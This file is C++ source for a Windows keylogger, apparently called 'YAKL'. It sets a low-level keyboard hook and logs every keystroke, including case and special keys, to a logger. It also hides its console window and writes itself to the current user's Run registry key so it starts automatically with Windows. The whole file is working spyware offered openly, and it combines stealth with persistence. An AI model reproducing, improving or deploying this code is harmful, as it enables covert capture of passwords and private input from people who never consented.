#include <Windows.h>
#include <iostream>
#include <string>
#include <tchar.h> // For TCHAR
#include "logger.h"

Logger logger; // Logger instance

std::string getKeyName(DWORD vkCode) {
    char keyName[128];

    if (vkCode >= 'A' && vkCode <= 'Z') {
        bool isShiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
        bool isCapsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

        if (isShiftPressed ^ isCapsLockOn) {
            return std::string(1, vkCode); // Uppercase
        } else {
            return std::string(1, vkCode + 32); // Lowercase
        }
    }

    switch (vkCode) {
        case VK_RETURN: return "Enter";
        case VK_BACK: return "Backspace";
        case VK_TAB: return "Tab";
        case VK_SPACE: return "Space";
        case VK_SHIFT: return "Shift";
        case VK_CONTROL: return "Control";
        case VK_MENU: return "Alt";
        case VK_ESCAPE: return "Escape";
        default: break;
    }

    UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
    if (GetKeyNameTextA(scanCode << 16, keyName, sizeof(keyName))) {
        return std::string(keyName);
    } else {
        return "Unknown Key";
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* pKBDllHookStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKBDllHookStruct->vkCode;

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            std::string keyName = getKeyName(vkCode);
            logger.logKey(keyName);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void hideConsoleWindow() {
    HWND hWnd = GetConsoleWindow();
    if (hWnd != NULL) {
        ShowWindow(hWnd, SW_HIDE);
    }
}

void addToStartup() {
    HKEY hKey;
    const char* appName = "YAKL";
    const char* exePath = "C:\\Path\\To\\YAKL.exe"; // Change to actual executable path

    if (RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, appName, 0, REG_SZ, (BYTE*)exePath, strlen(exePath) + 1);
        RegCloseKey(hKey);
    }
}

int main() {
    hideConsoleWindow();
    addToStartup(); // Add keylogger to startup

    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hHook == NULL) {
        std::cerr << "Error: Unable to set up keyboard hook!" << std::endl;
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    return 0;
}
